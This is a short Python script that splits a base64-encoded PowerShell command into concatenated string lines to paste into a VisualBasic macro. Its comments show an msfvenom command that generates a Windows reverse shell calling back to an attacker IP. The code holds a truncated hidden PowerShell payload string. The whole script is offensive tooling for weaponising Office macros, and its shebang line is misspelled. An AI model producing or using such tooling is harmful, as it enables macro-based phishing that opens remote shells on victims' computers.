#!/usr/bin/evn python3 
# -*- coding: utf-8 -*-

# This script was created to split up a base64 encoded payload. In VisualBasic literal strings have a character limit of 255. 
# The restriction does not apply to strings stored in variables. This script is for splitting a base64 encoded command into multiple lines while concantenating them.
#
# Generate a payload using msfvenom
# EXAMPLE: msfvenom -p windows/shell_reverse_tcp LHOST=<attacker_ip> LPORT=<port> -f hta-psh 
#
# From those results copy only the PowerShell command generated. (powershell.exe -nop -w hidden -e <base64 string>
# That string needs to get placed into the str variable below.


str = "powershell.exe -nop -w hidden -e aQBmACgAWw..."
n = 50

for i in range(0, len(str), n):
    print("Str = Str + \"{}\"".format(str[i:i+n]))
    
print("Copy and paste the above results into your macro")
